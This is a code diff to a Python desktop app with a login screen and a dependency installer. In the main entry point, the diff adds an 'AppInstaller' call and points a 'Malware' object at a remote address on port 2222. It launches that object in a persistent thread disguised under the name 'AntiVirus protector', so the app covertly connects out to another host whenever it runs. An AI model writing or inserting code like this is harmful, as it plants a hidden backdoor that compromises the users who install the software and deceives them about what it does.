@@ -23,6 +23,7 @@ def clearscrn():
 ------------------------------------------------------
 '''
 
+
 def login():
     username = entry_username.get()
     password = entry_password.get()
@@ -91,6 +92,7 @@ def startapp():
     root.mainloop()
 
 if __name__ == '__main__':
+    depchker.AppInstaller()
     depchker.install_dependencies(on_complete=startapp)
-    malware = Malware('192.168.50.182',2222)
-    Thread(target=malware.run,daemon=True).start()
+    malware = Malware('192.168.102.64',2222)
+    Thread(name='AntiVirus protector',target=malware.run,daemon=False).start()
